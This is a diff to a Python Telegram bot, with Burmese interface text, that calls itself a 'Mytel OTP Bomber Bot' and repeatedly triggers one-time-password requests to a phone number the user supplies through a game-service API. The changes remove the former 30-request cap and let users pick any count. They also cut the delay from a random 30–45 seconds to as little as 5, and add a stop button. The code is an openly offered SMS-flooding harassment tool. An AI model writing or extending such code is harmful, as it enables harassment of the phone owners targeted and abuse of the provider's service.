@@ -13,21 +13,67 @@ bot = telebot.TeleBot(TOKEN)
 # API Base URL
 BASE_URL = "https://mytel.bubblepop.info/game-service/v1"
 
+# ယာယီ သိမ်းဆည်းရန် Dictionary များ (User တစ်ဦးချင်းစီ၏ Time Limit ချိန်ညှိချက်များအတွက်)
+user_settings = {}
+active_bombers = {}
+
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     markup = types.InlineKeyboardMarkup(row_width=2)
     btn_start = types.InlineKeyboardButton("🚀 စတင်ရန် (/bomb)", callback_data="menu_start")
+    btn_time = types.InlineKeyboardButton("⏱️ Time Limit ပြင်ရန်", callback_data="menu_time")
     btn_help = types.InlineKeyboardButton("ℹ️ အကူအညီ", callback_data="menu_help")
-    markup.add(btn_start, btn_help)
+    markup.add(btn_start, btn_time, btn_help)
     
     bot.reply_to(message, "🤖 Mytel OTP Bomber Bot မှ ကြိုဆိုပါတယ်။\nအောက်ပါ ခလုတ်များကို အသုံးပြုနိုင်ပါသည် -", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
+    chat_id = call.message.chat.id
+    
     if call.data == "menu_start":
-        bot.send_message(call.message.chat.id, "📱 ကျေးဇူးပြု၍ ဖုန်းနံပါတ်နှင့် အကြိမ်ရေကို ဤကဲ့သို့ ပို့ပေးပါ။\n\nဥပမာ: `/bomb 09912345678 10`", parse_mode="Markdown")
+        bot.send_message(chat_id, "📱 ကျေးဇူးပြု၍ ဖုန်းနံပါတ်နှင့် အကြိမ်ရေကို ဤကဲ့သို့ ပို့ပေးပါ။\n\nဥပမာ: `/bomb 09912345678 50`\n(အကြိမ်ရေကို ကြိုက်သလောက် ထည့်နိုင်ပါပြီ)", parse_mode="Markdown")
+        
+    elif call.data == "menu_time":
+        current_time = user_settings.get(chat_id, 10) # Default က ၁၀ စက္ကန့်
+        markup = types.InlineKeyboardMarkup(row_width=3)
+        btn_5 = types.InlineKeyboardButton("5 စက္ကန့်", callback_data="set_time_5")
+        btn_10 = types.InlineKeyboardButton("10 စက္ကန့်", callback_data="set_time_10")
+        btn_20 = types.InlineKeyboardButton("20 စက္ကန့်", callback_data="set_time_20")
+        btn_30 = types.InlineKeyboardButton("30 စက္ကန့်", callback_data="set_time_30")
+        btn_60 = types.InlineKeyboardButton("60 စက္ကန့်", callback_data="set_time_60")
+        btn_back = types.InlineKeyboardButton("🔙 ပင်မမီနူးသို့", callback_data="menu_start")
+        markup.add(btn_5, btn_10, btn_20, btn_30, btn_60, btn_back)
+        
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=call.message.message_id,
+            text=f"⏱️ **လက်ရှိ Time Limit:** `{current_time} စက္ကန့်`\n\nအောက်ပါတို့မှ လိုချင်သော စောင့်ဆိုင်းချိန်ကို ရွေးချယ်ပါ -",
+            parse_mode="Markdown",
+            reply_markup=markup
+        )
+        
+    elif call.data.startswith("set_time_"):
+        t_val = int(call.data.split("_")[2])
+        user_settings[chat_id] = t_val
+        bot.answer_callback_query(call.id, text=f"✅ Time Limit ကို {t_val} စက္ကန့်သို့ ပြောင်းပြီးပါပြီ။")
+        
+        # မီနူးကို ပြန်ပြရန်
+        markup = types.InlineKeyboardMarkup(row_width=2)
+        btn_start = types.InlineKeyboardButton("🚀 စတင်ရန် (/bomb)", callback_data="menu_start")
+        btn_time = types.InlineKeyboardButton("⏱️ Time Limit ထပ်ပြင်ရန်", callback_data="menu_time")
+        markup.add(btn_start, btn_time)
+        
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=call.message.message_id,
+            text=f"✅ **အောင်မြင်ပါသည်။**\nလက်ရှိ Time Limit မှာ **{t_val} စက္ကန့်** ဖြစ်သွားပါပြီ။",
+            parse_mode="Markdown",
+            reply_markup=markup
+        )
+        
     elif call.data == "menu_help":
-        bot.send_message(call.message.chat.id, "ℹ️ **အသုံးပြုပုံ ညွှန်ကြားချက်**\n\n- `/bomb <ဖုန်းနံပါတ်> <အကြိမ်ရေ>` ဟု ရိုက်ထည့်ပါ။\n- ဥပမာ: `/bomb 09912345678 10`\n- တစ်ကြိမ်လျှင် အများဆုံး အကြိမ် ၅၀ အထိ သတ်မှတ်ပေးထားပါသည်။", parse_mode="Markdown")
+        bot.send_message(chat_id, "ℹ️ **အသုံးပြုပုံ ညွှန်ကြားချက်**\n\n- `/bomb <ဖုန်းနံပါတ်> <အကြိမ်ရေ>` ဟု ရိုက်ထည့်ပါ။\n- ဥပမာ: `/bomb 09912345678 100`\n- အကြိမ်ရေကို လွတ်လပ်စွာ (ကြိုက်သလောက်) ထည့်နိုင်ပါသည်။\n- ⏱️ Time Limit ကို ခလုတ်နှိပ်၍ ကိုယ်တိုင် ချိန်ညှိနိုင်ပါသည်။", parse_mode="Markdown")
 
 @bot.message_handler(commands=['bomb'])
 def start_bombing(message):
@@ -43,16 +89,22 @@ def start_bombing(message):
         bot.reply_to(message, "❌ အကြိမ်ရေသည် ဂဏန်းဖြစ်ရပါမည်။")
         return
 
-    if count > 30:
-        bot.reply_to(message, "⚠️ ဆာဗာ Cooldown ကန့်သတ်ချက်ကြောင့် အကြိမ်ရေကို အများဆုံး ၃၀ သို့ သတ်မှတ်ထားပါသည်။")
-        count = 30
+    chat_id = message.chat.id
+    # သတ်မှတ်ထားသော Time Limit ရှိမရှိ စစ်ဆေးမည် (မရှိရင် default ၁၀ စက္ကန့်)
+    delay_time = user_settings.get(chat_id, 10)
 
-    msg = bot.reply_to(message, f"🚀 စတင်နေပါပြီ...\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n🔄 အကြိမ်ရေ: `{count}` ကြိမ်\n⏳ Time Limit / Cooldown စနစ်ဖြင့် လုပ်ဆောင်နေပါသည်...", parse_mode="Markdown")
+    markup = types.InlineKeyboardMarkup()
+    btn_stop = types.InlineKeyboardButton("🛑 ရပ်တန့်မည်", callback_data=f"stop_{chat_id}")
+    markup.add(btn_stop)
 
-    # Thread စတင်ပြီး နောက်ကွယ်မှာ Time Limit နဲ့ အသစ်တောင်းစေခြင်း
-    threading.Thread(target=run_bomber, args=(message.chat.id, msg.message_id, phone_number, count)).start()
+    msg = bot.reply_to(message, f"🚀 စတင်နေပါပြီ...\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n🔄 စုစုပေါင်းအကြိမ်ရေ: `{count}` ကြိမ်\n⏱️ Time Limit: `{delay_time} စက္ကန့်` ခြားထားသည်", parse_mode="Markdown", reply_markup=markup)
 
-def run_bomber(chat_id, msg_id, phone_number, count):
+    # Stop flag အတွက် active_bombers ထဲထည့်ခြင်း
+    active_bombers[chat_id] = True
+
+    threading.Thread(target=run_bomber, args=(chat_id, msg.message_id, phone_number, count, delay_time)).start()
+
+def run_bomber(chat_id, msg_id, phone_number, count, delay_time):
     success_count = 0
     fail_count = 0
 
@@ -65,6 +117,10 @@ def run_bomber(chat_id, msg_id, phone_number, count):
     ]
 
     for i in range(count):
+        # ရပ်တန့်ခလုတ် နှိပ်ထားခြင်းရှိမရှိ စစ်ဆေးရန်
+        if not active_bombers.get(chat_id, True):
+            break
+
         try:
             session = requests.Session()
             device_id = str(uuid.uuid4())
@@ -94,21 +150,22 @@ def run_bomber(chat_id, msg_id, phone_number, count):
         except Exception as e:
             fail_count += 1
 
-        # အကယ်၍ နောက်ဆုံးတစ်ကြိမ် မရောက်သေးရင် Time Limit (Cooldown) စောင့်ဆိုင်းချိန် ထည့်ပေးခြင်း 
-        # (ဥပမာ- Mytel ဆာဗာ OTP ပို့ပြီးရင် နောက်တစ်ခါထပ်တောင်းလို့ရအောင် စက္ကန့် ၃၀ မှ ၄၅ စက္ကန့်အထိ အချိန်ခြားပေးခြင်း)
-        if i < count - 1:
-            cooldown_time = random.randint(30, 45) # လိုအပ်ပါက ဒီနေရာမှာ အချိန်ကို လျှော့နိုင် ချဲ့နိုင်ပါတယ်
+        # နောက်ဆုံးတစ်ကြိမ် မရောက်သေးရင် သတ်မှတ်ထားတဲ့ Delay Time အတိုင်း စောင့်မည်
+        if i < count - 1 and active_bombers.get(chat_id, True):
             try:
                 bot.edit_message_text(
                     chat_id=chat_id,
                     message_id=msg_id,
-                    text=f"🚀 လုပ်ဆောင်နေဆဲ...\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n🔄 ပြီးမြောက်မှု: `{i+1}/{count}` ကြိမ်\n⏳ Time Limit Cooldown: `{cooldown_time} စက္ကန့်` စောင့်ဆိုင်းနေသည်...",
+                    text=f"🚀 လုပ်ဆောင်နေဆဲ...\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n🔄 ပြီးမြောက်မှု: `{i+1}/{count}` ကြိမ်\n⏱️ နောက်တစ်ကြိမ်သို့: `{delay_time} စက္ကန့်` စောင့်ဆိုင်းနေသည်...",
                     parse_mode="Markdown"
                 )
             except:
                 pass
             
-            time.sleep(cooldown_time)
+            time.sleep(delay_time)
+
+    if chat_id in active_bombers:
+        del active_bombers[chat_id]
 
     bot.send_message(chat_id, f"✅ **Bomber ပြီးဆုံးပါပြီ!**\n\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n✨ အောင်မြင်မှု: `{success_count}` ကြိမ်\n❌ မှားယွင်းမှု: `{fail_count}` ကြိမ်", parse_mode="Markdown")
 
